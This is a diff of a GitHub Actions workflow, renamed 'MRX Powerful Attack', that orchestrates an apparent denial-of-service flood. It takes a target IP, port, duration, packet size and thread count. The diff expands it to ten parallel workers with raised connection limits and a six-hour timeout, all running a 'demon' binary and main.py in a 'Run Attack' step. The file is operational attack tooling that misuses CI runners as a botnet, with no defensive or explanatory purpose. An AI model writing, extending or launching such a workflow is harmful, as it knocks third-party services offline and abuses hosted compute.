@@ -1,4 +1,5 @@
-name: "MRX Project"
+name: "MRX Powerful Attack"
+
 on:
   workflow_dispatch:
     inputs:
@@ -11,28 +12,62 @@ on:
         required: true
         type: string
       duration:
-        description: "Attack Duration"
+        description: "Attack Duration (seconds)"
         required: true
         type: string
       packet_size:
-        description: "Packet Size"
+        description: "Packet Size (bytes)"
         required: true
         type: string
       threads:
-        description: "Connection Threads"
+        description: "Threads per worker"
         required: true
         type: string
 
 jobs:
   network-test:
     runs-on: ubuntu-latest
+    timeout-minutes: 360
     strategy:
+      fail-fast: false
       matrix:
-        worker: [1, 2, 3, 4, 5]
+        worker: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]
+    name: Worker ${{ matrix.worker }}
     steps:
     - name: Checkout code
-      uses: actions/checkout@v3
+      uses: actions/checkout@v4
+
+    - name: Setup Python
+      uses: actions/setup-python@v5
+      with:
+        python-version: '3.11'
+
+    - name: System Info
+      run: |
+        echo "Worker: ${{ matrix.worker }}"
+        echo "Target: ${{ inputs.ip }}:${{ inputs.port }}"
+        echo "Duration: ${{ inputs.duration }}s"
+        echo "CPU: $(nproc) cores"
+        ulimit -n 1048576 || true
+
     - name: Make binary executable
-      run: chmod +x demon
-    - name: Run Network Test
-      run: python3 main.py ${{ inputs.ip }} ${{ inputs.port }} ${{ inputs.duration }} ${{ inputs.packet_size }} ${{ inputs.threads }}
+      run: |
+        chmod +x demon || true
+        ls -la demon
+
+    - name: Run Attack
+      env:
+        TARGET_IP: ${{ inputs.ip }}
+        TARGET_PORT: ${{ inputs.port }}
+        ATTACK_DURATION: ${{ inputs.duration }}
+        PACKET_SIZE: ${{ inputs.packet_size }}
+        THREADS: ${{ inputs.threads }}
+        WORKER_ID: ${{ matrix.worker }}
+      run: |
+        echo "Starting attack worker $WORKER_ID"
+        python3 main.py
+
+    - name: Report Results
+      if: always()
+      run: |
+        echo "Worker ${{ matrix.worker }} completed"
